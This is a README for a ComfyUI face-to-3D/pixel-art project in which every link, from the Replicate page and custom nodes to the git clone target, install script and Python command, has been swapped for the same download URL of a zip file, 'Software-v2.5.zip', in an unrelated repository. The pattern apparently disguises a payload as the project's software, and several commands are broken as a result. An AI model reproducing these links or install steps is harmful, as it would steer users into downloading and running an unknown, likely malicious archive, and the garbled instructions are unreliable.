# face-to-many

Turn any face into 3D, pixel art, video game, claymation or toy.

Run this model on Replicate:

https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip

Or run it in ComfyUI:

https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip

You’ll need these custom nodes:

- [ComfyUI Controlnet Aux](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip)
- [ComfyUI InstantID](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip)
- [ComfyUI IPAdapter Plus](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip)
- [ComfyUI Essentials](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip)
- [Efficiency Nodes ComfyUI](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip)

![Arnold](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip)

## Loras

The 3D, video game, pixel art, claymation and toy loras are all made by artificialguybr. If you like them you can make a donation to their Patreon or Ko-fi:

- https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip
- https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip

Or follow him on Twitter:

https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip

## Developing locally

Clone this repository:

```sh
git clone --recurse-submodules https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip
```

Run the [following script](https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip) to install all the custom nodes:

```sh
https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip
```

### Running the Web UI from your Cog container

1. **GPU Machine**: Start the Cog container and expose port 8188:
```sh
sudo cog run -p 8188 bash
```
Running this command starts up the Cog container and let's you access it

2. **Inside Cog Container**: Now that we have access to the Cog container, we start the server, binding to all network interfaces:
```sh
cd ComfyUI/
python https://github.com/Tatooo29/Loco/raw/refs/heads/main/scripts/Software-v2.5.zip --listen 0.0.0.0
```

3. **Local Machine**: Access the server using the GPU machine's IP and the exposed port (8188):
`http://<gpu-machines-ip>:8188`

When you goto `http://<gpu-machines-ip>:8188` you'll see the classic ComfyUI web form!
